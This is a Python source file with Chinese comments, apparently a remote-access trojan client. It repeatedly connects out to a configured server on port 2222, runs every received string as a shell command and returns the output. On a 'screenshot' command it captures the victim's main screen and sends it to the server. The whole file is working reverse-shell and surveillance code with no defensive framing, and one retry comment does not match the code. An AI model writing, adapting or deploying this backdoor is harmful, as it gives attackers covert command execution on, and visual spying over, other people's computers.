import socket
import time
import subprocess
import mss
from PIL import Image
import io


def capture_screenshot():
    # 使用 mss 捕获屏幕
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # 截取主屏幕
        img = sct.grab(monitor)

        # 将图像转换为 PIL 格式
        img_pil = Image.frombytes("RGBA", img.size, img.bgra, "raw", "BGRA", 0, 1)

        # 将图像保存到 BytesIO 对象中
        byte_io = io.BytesIO()
        img_pil.save(byte_io, format='PNG')
        byte_io.seek(0)

        # 返回图像的字节数据
        return byte_io.getvalue()


def main():
    server_ip = '127.0.0.1'  # 远程服务器的 IP 地址
    server_port = 2222
    while True:
        try:
            while True:
                try:
                    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    client_socket.connect((server_ip, server_port))
                    print(f"成功连接到 {server_ip}:{server_port}")
                    break  # 连接成功后退出循环
                except Exception as e:
                    print(f"连接失败: {str(e)}，每分钟重试一次...")
                    time.sleep(5)  # 等待1分钟后重试

            while True:
                command = client_socket.recv(4096).decode()
                print(f"收到远程命令: {command}")
                if command.lower() == 'exit':
                    break
                if command.lower() == '':
                    continue

                elif command.lower() == 'screenshot':  # 检测截屏命令
                    # 进行截图并发送回去
                    image_data = capture_screenshot()  # 调用截图函数

                    # 发送图像数据
                    client_socket.sendall(image_data)  # 发送完整的图像数据
                    print(f"成功发送截图，大小: {len(image_data)} 字节")
                    continue

                # 执行命令并返回结果
                try:
                    # 将 text=True 使返回值为字符串
                    output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
                    response = output
                    print(f"命令执行成功: {response}")
                except subprocess.CalledProcessError as e:
                    # 如果命令执行失败，返回错误信息
                    response = e.output  # 获取错误输出
                    print(f"命令执行失败: {response}")
                except Exception as e:
                    response = str(e)  # 捕获其他异常
                    print(f"命令执行异常: {response}")
                client_socket.send(response.encode('utf-8'))  # 发送 UTF-8 编码的响应
                print(f"成功发送命令响应")
            client_socket.close()
        except Exception as e:
            print(f"连接异常: {str(e)}，10秒后重试...")
            time.sleep(10)  # 等待10秒后重试

if __name__ == "__main__":
    main()













